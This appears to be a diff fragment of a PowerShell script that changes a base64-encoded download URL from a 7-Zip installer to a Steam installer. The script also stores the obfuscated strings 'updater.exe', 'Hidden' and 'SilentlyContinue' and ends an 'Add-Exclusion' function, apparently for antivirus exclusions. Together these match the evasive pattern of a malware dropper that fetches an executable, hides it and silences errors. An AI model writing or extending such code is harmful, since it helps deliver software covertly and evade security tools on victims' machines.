@@ -5,7 +5,7 @@ function Add-Exclusion {
     } catch {}
 }
 
-$downloadUrlB64 = "aHR0cHM6Ly93d3cuNy16aXAub3JnL2EvN3oyNDA5LXg2NC5leGU="
+$downloadUrlB64 = "aHR0cHM6Ly9jZG4uZmFzdGx5LnN0ZWFtc3RhdGljLmNvbS9jbGllbnQvaW5zdGFsbGVyL1N0ZWFtU2V0dXAuZXhl"
 $updaterExeB64 = "dXBkYXRlci5leGU="
 $hiddenAttrB64 = "SGlkZGVu"
 $silentlyContinueB64 = "U2lsZW50bHljb250aW51ZQ=="
